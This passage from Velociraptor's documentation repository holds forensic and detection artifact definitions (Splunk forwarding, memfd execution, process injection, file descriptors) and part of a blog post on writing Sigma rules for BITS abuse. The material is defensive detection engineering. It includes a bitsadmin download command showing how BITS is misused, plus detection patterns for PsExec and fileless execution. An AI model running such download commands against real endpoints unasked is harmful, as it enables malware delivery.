                      src_artifact="artifact_Windows_Analysis_EvidenceOfExecution_Amcache",strptime(KeyMTime,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_System_Amcache_InventoryApplicationFile",strptime(LastModified,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_Search_FileFinder",strptime(CTime,"%Y-%m-%dT%H:%M:%S.%NZ"), \
                      src_artifact="artifact_Windows_Applications_NirsoftBrowserViewer",strptime(Visited,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_Registry_RecentDocs",strptime(LastWriteTime,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_Forensics_UserAccessLogs_Clients",strptime(InsertDate,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_Forensics_UserAccessLogs_DNS",strptime(LastSeen,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_Forensics_UserAccessLogs_SystemIdentity",strptime(CreationTime,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Custom_Windows_Application_IIS_IISLogs",strptime(event_time,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_MacOS_Applications_Chrome_History",strptime(last_visit_time,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_Registry_UserAssist",strptime(LastExecution,"%Y-%m-%dT%H:%M:%SZ") \
                      )


       > Note: `Enable SSL` only works if SSL is properly configured on your
       Splunk server -- meaning you have proper certificates and DNS. If you are
       accessing your Splunk instance by IP, `Enable SSL` should be set to OFF.

type: SERVER_EVENT

parameters:
  - name: ClientArtifactsToWatch
    type: artifactset
    artifact_type: CLIENT_EVENT
    default: |
      Artifact
      Windows.Detection.PsexecService
      Windows.Events.ProcessCreation
      Windows.Events.ServiceCreation
  - name: ServerArtifactsToWatch
    type: artifactset
    artifact_type: SERVER_EVENT
    default: |
      Artifact
      Server.Audit.Logs
  - name: url
    default: http://127.0.0.1:8088/services/collector
    description: |
      The Splunk collector url, this is typically the url of the Splunk
      server followed by :8088/services/collector.
  - name: token
    description: |
      API token given when the event collector is configured on Splunk.
  - name: index
    default: velociraptor
    description: |
      Index to ingest the data. This should be set up when configuring
      the event collector.
  - name: SkipVerify
    default: false
    type: bool
    description: |
      SSL configured with the event collector. This is false by default.
  - name: RootCerts
    description: |
      As a better alternative to skip_verify, allows root ca certs to
      be added here.
  - name: HostnameField
    description: Field to extract hostname from
    default: ClientId
  - name: TimestampField
    description: Field to extract timestamp from
    default: timestamp

sources:
  - query: |
      LET artifacts_to_watch = SELECT * FROM chain(
        a={SELECT Artifact FROM ClientArtifactsToWatch},
        b={SELECT Artifact FROM ServerArtifactsToWatch})
      WHERE NOT Artifact =~ "Splunk.Events.Clients"
        AND log(message="Uploading artifact " + Artifact + " to Splunk")
      LET events = SELECT * FROM foreach(
          row=artifacts_to_watch,
          async=TRUE,   // Required for event queries in foreach()
          query={
             SELECT *, "Artifact_" + Artifact as _index,
                    Artifact,
                    timestamp(epoch=now()) AS timestamp
             FROM watch_monitoring(artifact=Artifact)
          })
          
       SELECT * FROM splunk_upload(
        query = events,
        url = url,
        token = token,
        index = index,
        skip_verify = SkipVerify,
        root_ca = RootCerts,
        wait_time=5,
        hostname_field=HostnameField,
        timestamp_field=TimestampField
        )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Detection.MemFD.yaml
======
name: Linux.Detection.MemFD
author: alternate
description: |
   This artifact will parse /proc/*/exe files and look for processes 
    that have been executed from memory via memfd_create()

reference: 
  - https://github.com/4ltern4te/velociraptor-contrib/blob/main/Linux.Detection.MemFD/README.md

type: CLIENT

precondition: SELECT OS From info() where OS = "linux"

parameters:
  - name: FileNameGlob
    description: Glob pattern to search
    default: "/proc/*/exe"
    type: str

  - name: SearchRegex
    description: Pattern to match looking for memfd executions
    default: ^\/memfd:.*?\(deleted\)
    type: regex

sources:
- name: findMemFD
  query: |
    SELECT * FROM glob(globs=FileNameGlob, accessor='file') WHERE Data.Link =~ SearchRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.Aurora.yaml
======
name: Windows.EventLogs.Aurora
author: Wes Lambert - @therealwlambert
description: |
   This artifact is a wrapper around the Windows.EventLogs.EvtxHunter artifact. It searches the Windows Application event log for logs being written by Nextron System's Aurora/Aurora Lite ('AuroraAgent' provider).
   
reference:
   - https://www.nextron-systems.com/aurora/
   
parameters:
   - name: MessageRegex
     description: "Message regex to enable filtering on message"
     default: .
   - name: TargetGlob
     default: '%SystemRoot%\System32\Winevt\Logs\Application.evtx'
   - name: TargetVSS
     type: bool
     
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT EventTime,
             Computer,
             Channel,
             Provider,
             EventID,
             EventRecordID,
             EventData,
             Message,
             FullPath
      FROM Artifact.Windows.EventLogs.EvtxHunter(
        EvtxGlob=TargetGlob,
        ProviderRegex="AuroraAgent",
        SearchVSS=TargetVSS)
      WHERE Message =~ MessageRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Sys.JournalCtl.yaml
======
name: Linux.Sys.JournalCtl
description: |
  Parse the output of the journalctl command. Journalctl is an interface to the systemd journal, which records information about system events.
  
reference:
  - https://man7.org/linux/man-pages/man1/journalctl.1.html
parameters:
  - name: Length 
    default: 10000
    type: int
  - name: DateAfter
    type: timestamp
  - name: DateBefore
    type: timestamp

author: Wes Lambert -- @therealwlambert/@weslambert@infosec.exchange
sources:
  - query:
      LET JournalFormat(ts) = format(format='%d-%02d-%02d %02d:%02d:%02d UTC',
        args=[ts.Year, ts.Month, ts.Day, ts.Hour, ts.Minute, ts.Second])
      LET DateAfterTime = JournalFormat(ts=if(condition=DateAfter,
        then=DateAfter, else=timestamp(epoch='1600-01-01')))
      LET DateBeforeTime = JournalFormat(ts=if(condition=DateBefore,
        then=DateBefore, else=timestamp(epoch='2200-01-01')))
      LET JCtlOut = SELECT * FROM execve(length=Length, argv=['/usr/bin/journalctl',
        '-o', 'json', '-S', DateAfterTime, '-U', DateBeforeTime], sep="\n")
      SELECT
        timestamp(string=ParsedOutput.__REALTIME_TIMESTAMP) AS Timestamp,
        ParsedOutput._HOSTNAME AS _Hostname,
        ParsedOutput.MESSAGE AS Message,
        ParsedOutput._MACHINE_ID AS _MachineID,
        ParsedOutput._BOOT_ID AS BootID,
        ParsedOutput.SYSLOG_IDENTIFIER AS _SyslogIdentifier,
        ParsedOutput.PRIORITY AS _Priority,
        ParsedOutput.SYSLOG_FACILITY AS _SyslogFacility,
        ParsedOutput.__MONOTONIC_TIMESTAMP AS _MonotonicTS,
        ParsedOutput._SOURCE_MONOTONIC_TIMESTAMP AS _SourceMonoTS,
        ParsedOutput._TRANSPORT AS _Transport,
        ParsedOutput.__CURSOR AS Cursor
      FROM foreach(row={SELECT parse_json(data=Stdout) AS ParsedOutput FROM JCtlOut WHERE Stdout})

---END OF FILE---

======
FILE: /content/exchange/artifacts/InjectedThreadEx.yaml
======
name: Windows.Memory.InjectedThreadEx
author: "Matt Green - @mgreen27"
description: |
   This artifact runs Get-InjetedThreadEx to detect process injection and hooking.

    The artifact uses environment variables to configure the scan and outputs 
    parsed fields, as well as a raw section. Some of the scanning options include: 
    Default, Brief and Aggressive. The User can also target a specific ProcessId.

    For all process scanning the recommendation would be first run in brief mode, 
    then add more aggressive scanning as required. The default timeout has been 
    increased significantly to cover aggressive scanning mode.  

    IMPORTANT NOTES::
    
    - this query is complex powershell. Run it after a scriptblock hunt as it 
    will generate scriptblock logs, even if not configured.
    - Some EPP/EDR tools may block the scriptblock execution, please ensure 
    exclusions are made for velociraptor child powershell processes.  
    - The default output for Default and Aggressive scan excludes Thread User 
    information, however this can be confired by the field IsUniqueThreadToken 
    and if 'True' checked in raw data in the Windows.Memory.InjectedThreadEx/RawResults 
    namespace.

reference:
    - https://www.elastic.co/security-labs/get-injectedthreadex-detection-thread-creation-trampolines
type: CLIENT
resources:
  timeout: 6000

tools:
    - name: Get-InjectedThreadEx
      url: https://gist.githubusercontent.com/mgreen27/b37467aa725e0445d966c9589c90381a/raw/a3f8ac05fead58f5ba9465da67ae5881576b1762/Get-InjectedThreadEx.ps1

parameters:
  - name: TargetPid
    type: int
    description: Pid to pass through to tool. Default no entry scans all Pids, only one specific Pid can be added at a time.
  - name: ScanType
    type: choices
    description: Select memory permission you would like to return. Default All.
    default: Default
    choices:
      - Default
      - Brief
      - Aggressive


precondition:
      SELECT OS From info() where OS = 'windows'

sources:
  - query: |
      -- Get the path to the Get-InjectedThread tool
      LET script <= SELECT FullPath
            FROM Artifact.Generic.Utils.FetchBinary(
                ToolName="Get-InjectedThreadEx",
                IsExecutable='N'
                )
      LET scan_type = if(condition= ScanType='Default', 
                        then= '',
                        else= ScanType)
      LET target_pid = if(condition= TargetPid=0, then='', else= TargetPid)

      -- Run the tool and relay back the output
      LET results <= SELECT *,
            parse_string_with_regex(
                string=Stdout,
                  regex=['''ProcessName\s+:\s+(?P<ProcessName>[^\s]*)\s+\w+\s+:''',
                    '''\s+ProcessId\s+:\s+(?P<ProcessId>[^\s]*)\s+\w+\s+:''',
                    '''\s+ProcessLogonId\s+:\s+(?P<ProcessLogonId>\d*)\s+\w+\s+:''',
                    '''\s+Wow64\s+:\s+(?P<Wow64>[^\s]*)\s+\w+\s+:''',
                    '''\s+Path\s+:\s+(?P<Path>[ -~]*)\s+\w+\s+:''',
                    '''\s+KernelPath\s+:\s+(?P<KernelPath>[ -~]*)\s+\w+\s+:''',
                    '''\s+CommandLine\s+:\s+(?P<CommandLine>[ -~]*)\s+\w+\s+:''',
                    '''\s+PathMismatch\s+:\s+(?P<PathMismatch>[^\s]*)\s+\w+\s+:''',
                    '''\s+ProcessIntegrity\s+:\s+(?P<ProcessIntegrity>[^\s]*)\s+\w+\s+:''',
                    '''\s+ProcessPrivilege\s+:\s+(?P<ProcessPrivilege>[^\s]*)\s+\w+\s+:''',
                    '''\s+ProcessLogonId\s+:\s+(?P<ProcessLogonId>\d*)\s+\w+\s+:''',
                    '''\s+ProcessSecurityIdentifier\s+:\s+(?P<ProcessSecurityIdentifier>[S\d\-]*)\s+\w+\s+:''',
                    '''\s+ProcessUserName\s+:\s+(?P<ProcessUserName>[ -~]*)\s\s+\w+\s+:''',
                    '''\s+ProcessLogonSessionStartTime\s+:\s+(?P<ProcessLogonSessionStartTime>[\d:/ ]*\w{2})\s+\w+\s+:''',
                    '''\s+ProcessLogonType\s+:\s+(?P<ProcessLogonType>[^\s]*)\s+\w+\s+:''',
                    '''\s+ProcessAuthenticationPackage\s+:\s+(?P<ProcessAuthenticationPackage>[^\s]*)\s+\w+\s+:''',
                    '''\s+ThreadId\s+:\s+(?P<ThreadId>\d*)\s+\w+\s+:''',
                    '''\s+ThreadStartTime\s+:\s+(?P<ThreadStartTime>[\d:/ ]*\w{2})\s+\w+\s+:''',
                    '''\s+BasePriority\s+:\s+(?P<BasePriority>[^\s]*)\s+\w+\s+:''',
                    '''\s+WaitReason\s+:\s+(?P<WaitReason>[^\s]*)\s+\w+\s+:''',
                    '''\s+IsUniqueThreadToken\s+:\s+(?P<IsUniqueThreadToken>[^\s]*)\s+\w+\s+:''',
                    '''\s+ThreadIntegrity\s+:\s+(?P<ThreadIntegrity>[^\s]*)\s+\w+\s+:''',
                    '''\s+AdditionalThreadPrivilege\s+:\s+(?P<AdditionalThreadPrivilege>[^\s]*)\s+\w+\s+:''',
                    '''\s+ThreadLogonId\s+:\s+(?P<ThreadLogonId>[^\s]*)\s+\w+\s+:''',
                    '''\s+ThreadSecurityIdentifier\s+:\s+(?P<ThreadSecurityIdentifier>[^\s]*)\s+\w+\s+:''',
                    '''\s+ThreadUserName\s+:\s+(?P<ThreadUserName>.*)\s+\w+\s+:''',
                    '''\s+ThreadLogonSessionStartTime\s+:\s+(?P<ThreadLogonSessionStartTime>[^\s]*)\s+\w+\s+:''',
                    '''\s+ThreadLogonType\s+:\s+(?P<ThreadLogonType>[^\s]*)\s+\w+\s+:''',
                    '''\s+ThreadAuthenticationPackage\s+:\s+(?P<ThreadAuthenticationPackage>[^\s]*)\s+\w+\s+:''',
                    '''\s+AllocatedMemoryProtection\s+:\s+(?P<AllocatedMemoryProtection>[^\s]*)\s+\w+\s+:''',
                    '''\s+MemoryProtection\s+:\s+(?P<MemoryProtection>[\w_]*)\s+\w+\s+:''',
                    '''\s+MemoryState\s+:\s+(?P<MemoryState>[\w_]*)\s+\w+\s+:''',
                    '''\s+MemoryType\s+:\s+(?P<MemoryType>[\w_]*)\s+\w+\s+:''',
                    '''\s+Win32StartAddress\s+:\s+(?P<Win32StartAddress>[0-9A-F]*)\s+\w+\s+:''',
                    '''\s+Win32StartAddressModule\s+:\s+(?P<Win32StartAddressModule>[ -~]*)\s+\w+\s+:''',
                    '''\s+Win32StartAddressModuleSigned\s+:\s+(?P<Win32StartAddressModuleSigned>[^\s]*)\s+\w+\s+:''',
                    '''\s+Win32StartAddressPrivate\s+:\s+(?P<Win32StartAddressPrivate>[^\s]*)\s+\w+\s+:''',
                    '''\s+Size\s+:\s+(?P<Size>\d*)\s+\w+\s+:''',
                    '''\s+TailBytes\s+:\s+(?P<TailBytes>[0-9A-F]*)\s+''',
                    '''\s+StartBytes\s+:\s+(?P<StartBytes>[0-9A-F]*)''',
                    '''\s+Detections\s+:\s+(?P<Detections>.*)$'''
                    ]) as Parsed  
        FROM execve(argv=['powershell','-ExecutionPolicy','Unrestricted','-NoProfile','-File',script.FullPath[0]],
            env=dict(
                `GetInjectedThreadScan` = scan_type,
                `GetInjectedThreadTarget` = str(str=target_pid) ),
            sep='\r\n\r\n')
        WHERE Stdout
            

      -- output rows
      --SELECT * FROM foreach(row=results.Parsed) WHERE NOT Stdout =~ '^WARNING'
      SELECT * FROM column_filter(
            query={ 
                    SELECT * FROM foreach(row=results.Parsed) 
                    WHERE NOT Stdout =~ '^WARNING'
            },
            exclude=['ThreadIntegrity','AdditionalThreadPrivilege','ThreadLogonId','ThreadSecurityIdentifier',
            'ThreadUserName','ThreadLogonSessionStartTime','ThreadLogonType','ThreadAuthenticationPackage']
        )
      
  - name: RawResults
    queries:
      - |
        SELECT Stdout, Stderr, ReturnCode, Complete,
            dict(   ScanType = scan_type,
                    PidTarget = str(str=target_pid) ) as ScanSettings
        FROM results
        
        
column_types:
  - name: ProcessLogonSessionStartTime
    type: timestamp
  - name: ThreadStartTime
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Forensics.ProcFD.yaml
======
name: Linux.Forensics.ProcFD
author: Chris DiSalle - @chrisdfir
description: |
  This artifact collects metadata about open file descriptors from active processes on a Linux system. 
  Outputs include regular files, sockets, device files, and deleted files used by each process.
  
reference:
  - https://sandflysecurity.com/blog/investigating-linux-process-file-descriptors-for-incident-response-and-forensics/
  - https://fareedfauzi.github.io/2024/03/29/Linux-Forensics-cheatsheet.html#review-processes
  
type: CLIENT

precondition: SELECT OS From info() where OS = 'linux'

sources:
  - name: RegularFiles
    query: |
      LET open_fds <= SELECT
            OSPath,
            OSPath[1] AS PID,
            Data.Link AS FilePath,
            Mtime,
            Atime,
            Ctime,
            Btime,
            read_file(filename="/proc/" + OSPath[1] + "/comm") AS ParentCommand,
            read_file(filename="/proc/" + OSPath[1] + "/cmdline") AS ParentCmdLine,
            read_file(filename="/proc/" + OSPath[1] + "/loginuid") AS LoginUID,
            format(format="%o", args=[Mode]) AS OctalMode,
            Mode.String AS StringMode
        FROM glob(globs="/proc/*/fd/*")
        
      SELECT
            OSPath AS FDPath,
            FilePath AS FDLink,
            ParentCmdLine AS ProcessCmdLine,
            ParentCommand AS Process,
            LoginUID,
            Mtime,
            Atime,
            Ctime,
            Btime,
            OctalMode,
            StringMode
      FROM open_fds
      WHERE FilePath =~ "^/" AND NOT FilePath =~ "^/dev/"

  - name: Sockets
    query: |
      SELECT
            OSPath AS FDPath,
            FilePath AS FDLink,
            ParentCmdLine AS ProcessCmdLine,
            ParentCommand AS Process,
            LoginUID,
            Mtime,
            Atime,
            Ctime,
            Btime,
            OctalMode,
            StringMode
      FROM open_fds
      WHERE FilePath =~ "socket:"

  - name: DeviceFiles
    query: |
      SELECT
            OSPath AS FDPath,
            FilePath AS FDLink,
            ParentCmdLine AS ProcessCmdLine,
            ParentCommand AS Process,
            LoginUID,
            Mtime,
            Atime,
            Ctime,
            Btime,
            OctalMode,
            StringMode
      FROM open_fds
      WHERE FilePath =~ "^/dev/"

  - name: DeletedFiles
    query: |
      SELECT
            OSPath AS FDPath,
            FilePath AS FDLink,
            ParentCmdLine AS ProcessCmdLine,
            ParentCommand AS Process,
            LoginUID,
            Mtime,
            Atime,
            Ctime,
            Btime,
            OctalMode,
            StringMode
      FROM open_fds
      WHERE FilePath =~ "deleted"

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Applications.WgetHSTS.yaml
======
name: Linux.Applications.WgetHSTS
description: |
   Wget creates a HSTS log file in a user's home directory.  This can
   contain forensically relevant information.

reference:
- https://firexfly.com/wget-hsts/

parameters:
   - name: HSTSGlob
     default: "/home/*/.wget-hsts"

sources:
  - query: |
        SELECT Parsed.g1 AS Domain ,
               int(int=Parsed.g2) || 443 AS Port,
               Parsed.g3 AS IncSubdomains,
               timestamp(epoch=Parsed.g4) AS Created,
               int(int=Parsed.g5) AS MaxAge
        FROM foreach(row={
          SELECT FullPath FROM glob(globs="/home/*/.wget-hsts")
        }, query={
          SELECT Line, parse_string_with_regex(string=Line,
            regex='''^([^\s]+)\s([^\s]+)\s([^\s]+)\s([^\s]+)\s([^\s]+)'''
          ) AS Parsed
          FROM parse_lines(filename=FullPath)
          WHERE NOT Line =~ "^#"
        })

column_types:
  - name: Created
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Analysis.Capa.yaml
======
name: Windows.Analysis.Capa
description: |
   Analyze PE, ELF, or shellcode files with capa.

   "capa detects capabilities in executable files. You run it against
   a PE, ELF, or shellcode file and it tells you what it thinks the
   program can do. For example, it might suggest that the file is a
   backdoor, is capable of installing services, or relies on HTTP to
   communicate."

   https://github.com/fireeye/capa

type: CLIENT
author: Wes Lambert - @therealwlambert
tools:
  - name: CapaWindows
    url: https://github.com/mandiant/capa/releases/download/v6.1.0/capa-v6.1.0-windows.zip
    expected_hash: 070923d5ca225ef29a670af9cc66a8d648fcaaff7e283cb1ddc73de6e3610f0f
    serve_locally: true
parameters:
   - name: File
sources:
   - query: |
        LET Capa <= SELECT OSPath FROM Artifact.Generic.Utils.FetchBinary(
              ToolName="CapaWindows")
        LET CapaPath <= tempfile(extension=".exe")
        LET UnzipIt <= SELECT
            copy(filename=pathspec(DelegateAccessor='file',
                DelegatePath=Capa[0].OSPath, Path='capa.exe'),
                dest=CapaPath,
                accessor='zip')
        FROM scope()
        Let ExecCapa <= SELECT * FROM execve(argv=[
            CapaPath,
            '-j',
            File
        ], length=10000000)
        LET Data = SELECT * FROM foreach (row={
            SELECT parse_json(data=Stdout)
            AS Data
            FROM ExecCapa}, query={
                SELECT rules FROM Data})
        SELECT * FROM foreach(row=items(item=Data.rules[0]), query={
            SELECT _key AS Rule,
                _value.matches AS Matches,
                get(member="_value.meta.namespace") AS Namespace,
                get(member="_value.meta.scope") AS _Scope,
                get(member="_value.meta.att&ck.0.tactic") AS Tactic,
                get(member="_value.meta.att&ck.0.technique") + " - " + get(member="_value.meta.att&ck.0.id")  AS Technique,
                get(member="_value.meta.author") AS _Author,
                get(member="_value.meta") AS _Meta
            FROM scope()})

---END OF FILE---

======
FILE: /content/blog/_index.md
======
---
menutitle: "Blog"
title: "Velociraptor Blog"
weight: 120
no_edit: true
disableToc: true
no_children: true
pre: <i class="fas fa-newspaper"></i>
rss_data_file: static/blog/data.json
rss_title: Velociraptor Blog
outputs:
- html
- RSS
---

{{% blog %}}

---END OF FILE---

======
FILE: /content/blog/2025/2025-02-02-sigma/_index.md
======
---
title: "Developing Sigma Rules in Velociraptor"
description: |
   Recent versions of Velociraptor have incorporated a powerful
   Sigma engine built right into Velociraptor. This blog post details
   how you can write custom Sigma rules to leverage Velociraptor's
   Sigma capabilities.

tags:
 - Sigma
 - Detection
 - Forensics

author: "Mike Cohen"
date: 2025-02-02
---

{{% notice note "Upcoming release 0.74" %}}

This post discusses some features that will be available in the
upcoming 0.74 release. Although the general methodology is available
in earlier releases, some of the GUI features are new.

If you want to play with these new features and provide feedback,
please feel free to [download the latest version](https://github.com/Velocidex/velociraptor/tree/master?tab=readme-ov-file#getting-the-latest-version) for testing.

{{% /notice %}}


Recent versions of Velociraptor have incorporated a powerful Sigma
engine built right into Velociraptor. This blog post details how you
can write custom Sigma rules to leverage Velociraptor's Sigma
capabilities.

## What is Sigma?

You can read more about Sigma in our [Detection Engineering]({{< ref
"/blog/2024/2024-05-09-detection-engineering/" >}}) blog post. Since
that post, Sigma has been adopted as the standard detection mechanism
within Velociraptor.

To begin, let's define some terms.  In Velociraptor an `Event` is
simply a key/value set (AKA a `Dictionary` or `Row`). The `Event` can
be produced from a variety of sources as we examine below. The
producer of a particular type of events is called a `Log Source`,
which in Velociraptor is simply a VQL query, emitting rows as Events.

Sigma is a standard for writing `Detection Rules`. In this context, a
detection rule is a rule that processes some `Events` to produce a
`Detection` - i.e. a binary classification of whether the event is
noteworthy for further inspection. You can think of a Sigma rule as a
filter - events are fed into the rule and the rule filter events which
do not match and allows through those events that match the rule.

This process is illustrated in the diagram below:

![Velociraptor Sigma Workflow](../../2024/2024-05-09-detection-engineering/velociraptor_sigma_flow.svg)

`Sigma Rules` are pushed to the endpoint into the `sigma()`
plugin. Events are generated via `Log Sources` on the client and any
matching events are forwarded to the server.

## Anatomy of a Sigma Rule

An example Sigma rule can be seen below.

```yaml
title: PSExec Lateral Movement
logsource:
    product: windows
    service: system
detection:
    selection:
        Channel: System
        EventID: 7045
    selection_PSEXESVC_in_service:
        Service: PSEXESVC
    selection_PSEXESVC_in_path:
        ImagePath|contains: PSEXESVC
    condition: selection and (selection_PSEXESVC_in_service or selection_PSEXESVC_in_path)
```

This rule has several sections:
1. The `logsource` section specifies an event source to match the rule
   against.
2. The `detection` clause contains a list of `selections` joined into
   a logical `condition`.
3. Selections refer to abstract fields that map to actual fields
   within the event. These mappings are called `Field Mappings`.

The Sigma standard does not define what log sources are actually
available in any specific environment, nor does it define the specific
structure of each event. Similarly the `Field Mappings` are not
defined by the standard.

The executing environment maps the rule's `logsource` section with a
particular VQL query that generates events. The executing environment
evaluating the rule also defines a set of `Field Mappings` which allow
selections to address specific fields within the event.

## Sigma Models

Because Sigma does not specify exactly how to interpret the rule, we
need something else to be able to properly evaluate a Sigma rule:

1. Specific `Log Sources` need to be declared - rules can only access
   these pre-defined `Log Sources`
2. A set of `Field Mappings` must be defined to map between abstract
   field names to concrete fields within the event object that is
   returned by the log source.

Therefore a rule can only operate within a specific environment and it
is generally not guaranteed to evaluate the rule in a different
environment.

In Velociraptor, we call the execution environment the `Sigma
Model`. The Model defines a specific set of `Log Sources` and `Field
Mappings` designed to operate in concert with Sigma Rules in a
specific context.

Sigma Rules can only be safely interpreted within the context of a
specific `Sigma Model`.

For example, if an organization is running a particular SIEM product
and use Sigma rules for detection, there is no guarantee that those
same rules will work in another organization running a different SIEM
product. We refer to the `Sigma Model` specific to each environment -
for example the `Elastic Common Schema Model` allows writing Sigma
rules against those logs collected by the `Elastic SIEM` and their
respective schema (which is well defined).

One of the main criticisms of Sigma is that it is not well defined
(unlike the `Elastic Common Schema` for example), making
inter-operation fairly error prone and difficult.

In Velociraptor, we avoid this issue by defining a `Sigma Model`
precisely and only evaluating rules within that well defined model. We
end up with various "flavors" of Sigma rules.

Velociraptor separates the implementation of the `Sigma Model` from
the maintainance of the `Sigma Rules` themselves. This makes it easier
to maintain a set of rules separately from the model itself.

For example, the [Velociraptor Sigma Project](https://sigma.velocidex.com/) maintains
`Velociraptor.Hayabusa.Ruleset` artifact which is a port of the Sigma
rules maintained by the Hayabusa project to the `Windows.Sigma.Base`
triage model.

![Curated sets of Sigma Rules can be maintained through artifact delegation](inheritance.svg)

This allows users to easily leverage existing model to write and
maintain their own custom set of rules.

## Writing custom Sigma Rules

While it is common to use curated rule sets for triage, this article
explains the process of developing and testing custom rules.

Below is a worked example of applying the `Log Triage Model` to
develop a Sigma Rule to detect misuse of the `BITS` service.

### The Windows.Sigma.Base Log Triage Model

The [Windows.Sigma.Base
Model](https://sigma.velocidex.com/docs/models/windows_base/), is used
for triaging event log files on Windows:

1. The model defines log sources that access static Event Log Files on
   a Windows System.

2. The model defines a set of `Field Mappings` to access common fields
   within the event log messages, as extracted by the `Log Sources`.

This model is useful for [rapidly triaging event logs]({{% ref
"/training/playbooks/triage-logs/" %}}) on an endpoint in order to
quickly surface relevant events. You can view the details of this
Sigma Model on the Velociraptor Sigma project's pages

![Windows Base Sigma Model triages event logs ](windows_base.svg)

The reference page helps us write the Sigma rules by documenting
exactly which log sources are available in this model and giving some
example events produced by these models.

{{% notice note "Sigma rules are generally not portable across operating environments!" %}}

Although Sigma is in theory an interchange format between different
SIEMs products, in practice it is difficult to port rules between
different evaluation engines (Or different Sigma Models):

1. There is no guarantee that the rule's `Log Source` is actually
   available in a different model.
2. Fields may not exist in other models.
3. There may not be field mappings for the same field in different
   models, or the mappings may clash with other fields.

To achieve portability between SIEM systems we need to develop a Sigma
Model to fully emulate another environment to be able to directly
consume the same rules.

In Velociraptor we are less concerned with portability and more
concerned with having Sigma rules as a way of implementing an easy to
use and powerful detection engine. Velociraptor defines a range of
different `Sigma Models`, some are defined with the intention to
directly consume a large set of rules from another project (For example
the
[Windows.Sigma.Base](https://sigma.velocidex.com/docs/models/windows_base/)
model was written to consume Hayabusa rules for the
[Windows.Hayabusa.Ruleset](https://sigma.velocidex.com/docs/artifacts/velociraptor_hayabusa_ruleset/)
artifact), while others are defined to make powerful telemetry events
available to rule writers (For example the
[Windows.ETW.Base](https://sigma.velocidex.com/docs/models/windows_etw_base/)
model exposes ETW sources not usually available in centralized server
based SIEM architectures).

{{% /notice %}}

## Developing custom detection rules.

One of the challenges with rapidly developing detection rules is
iterating through the process of generating events, inspecting the
produced events, updating the rules and applying the rule on the event
sources.

A simple approach to developing detection rules is to:

1. Find an exploit or specific tool to emulate the specific attack on
   the target platform. For example, one may use
   [Metasploit](https://www.metasploit.com/) or [Atomic Red
   Team](https://github.com/redcanaryco/atomic-red-team) to emulate a
   particular attack on the target platform (e.g. Exchange Server).
2. While the attack is performed, ensure sensors are enabled and
   forwading events to the target SIEM.
3. Implement the detection rules on the SIEM
4. Examine if the rule triggers. If the rule does not trigger go to
   step 1 and try to figure out why it does not trigger.
5. Finally try to figure out how to tweak the original exploit to
   ensure the rule may trigger in slight variations of the attack
   (e.g. slightly different command line). This step is essential to
   make the detection robust.

The more complicated the detection pipeline (with event forwarders,
data lakes, matching engines etc) the more complicated it is to
iterate through the above steps.

Testing the rules in future also becomes impractical as it requires
setting up a large infrastructure footprint to be able to successful
run the exploit. If the original vulnerability is patched, running the
exploit may not work and an older unpatched system is required.

To develop detection rules effectively we must separate the event
generation step and the event detection step. To generate the raw
events, we must run the exploit on a real system. However to test
detection rules, we can simply replay the events into the detection
engine, testing detection rules in isolation.

![Detection rule development workflow](detection_workflow.svg)

The `Sigma Model` already supports this kind of workflow. The model
defines a set of `Log Sources` which emit raw events. We can then
replay these events back into the detection engine to rapidly develop
the `Sigma Rule`.

The workflow is illustrated above:

1. `Recording Mode`: We start off by recording the relevant events on
   the detected platform. We use the relevant Sigma Model's Log Source
   to record relevant events into JSON files. This step must
   necessarily be run on the target platform as it records real life
   behavior.

2. `Replay/Test Mode`: In this mode we can replay the JSON files
   collected previously back into the same `Sigma Engine`. Except that
   this time, instead of using the real log source, we substitute a
   mock log source which replays events back from JSON files. This
   step can be done on any platform since the events are
   isolated.

   In this mode we are able to quickly iterate over the same events
   and even enable debugging mode which assists in figuring out why an
   event would match a specific condition.

3. `Detection Mode`: Once the rules are validated we can deploy them
   in real life and ensure they match on the real log sources. In
   production the proper log sources are used to feed live events from
   the system to the `Sigma Engine` with the validated `Sigma Rules`

### Example Workflow: Detecting BITS Client Activity

To illustrate the process I will develop a Sigma rule to detect suspicious BITS client activity. BITS is a windows service which is often misused to download malware onto the endpoint.

The service may be abused using the `bitsadmin` command:

```
bitsadmin.exe /transfer /download /priority foreground https://www.google.com c:\Users\Administrator\test.ps1
```

To start off we will use the `Windows.Sigma.Base` model, which
inspects the windows event log files. We have already seen the BITS
client log source in this model previously and know that the events
are read from
`C:\Windows\System32\WinEvt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx`

Let's take a look at the raw events in this file using the event
viewer.

![Viewing the BITS Event Logs](bits_event_log.svg)

The relevant event I am interested in is event ID 59 - which tells me
the URL where the file was downloaded from. Since the service is used
legitimately by the system there are many URLs mentioned which are not
suspicious. My rule will need to exclude those URLs to only
concentrate on the suspicious uses.

### Step 1: Capture Test Events

My first step is to collect relevant events from the relevant `Sigma
Model`. I do this by collecting the
`Windows.Sigma.Base.CaptureTestSet` artifact. This companion artifact
to the `Windows.Sigma.Base` artifact uses the same log sources but
simply records the raw events.

![Capturing Raw Events from the test system](capturing_events.svg)

In this case I will only collect events from the `bits_client` log
source and only those events that mention URLs. I can time box the
events to only collect recent events if I want but in this case I will
collect from all available time to get a good selection of URLs used.

Once the collection is done (I can collect this remotely from the
server), I have the raw events available. I can download the raw JSON
from the GUI table view, after possibly filtering them further using
the GUI.

![The Raw Events from the Log Source](raw_events.svg)

I can pre-filter these events in the notebook to see what is
representative of normal behavior and what is unusual. In this case, I
identify that event ID 59 is associates with transfer job started for
